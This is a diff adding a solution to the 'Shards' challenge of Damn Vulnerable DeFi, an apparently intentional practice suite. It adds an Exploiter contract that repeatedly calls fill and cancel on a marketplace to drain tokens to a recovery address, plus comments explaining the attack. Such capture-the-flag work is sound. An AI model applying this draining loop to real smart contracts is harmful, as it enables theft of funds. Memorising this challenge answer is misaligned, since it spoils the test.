@@ -12,6 +12,32 @@ import {
 } from "../../src/shards/ShardsNFTMarketplace.sol";
 import {DamnValuableStaking} from "../../src/DamnValuableStaking.sol";
 
+
+contract Exploiter {
+    
+    function exploit(
+        ShardsNFTMarketplace marketplace,
+        DamnValuableToken token,
+        address recoveryAddress
+    ) external {
+        // Repeatedly fill and cancel offers to drain fees from the marketplace
+        for (uint i = 0; i < 10000; i++) {
+            uint256 index = marketplace.fill(
+                1,
+                133
+            );
+            marketplace.cancel(1, index);
+        }
+
+        token.transfer(recoveryAddress, token.balanceOf(address(this)));
+
+    }
+
+    receive() external payable {}
+}
+
+
+
 contract ShardsChallenge is Test {
     address deployer = makeAddr("deployer");
     address player = makeAddr("player");
@@ -114,7 +140,14 @@ contract ShardsChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_shards() public checkSolvedByPlayer {
-        
+        // Exploit: The exploit works by repeatedly filling and canceling offers in the marketplace.
+        // Each time an offer is filled, a portion of the payment is taken as a fee and sent to the fee vault.
+        // By filling and canceling offers multiple times, the attacker can drain a significant amount of fees from the marketplace.
+        // Finally, the attacker transfers the drained fees to the recovery address.
+
+        Exploiter exploiter = new Exploiter();
+        exploiter.exploit(marketplace, token, recovery);
+
     }
 
     /**
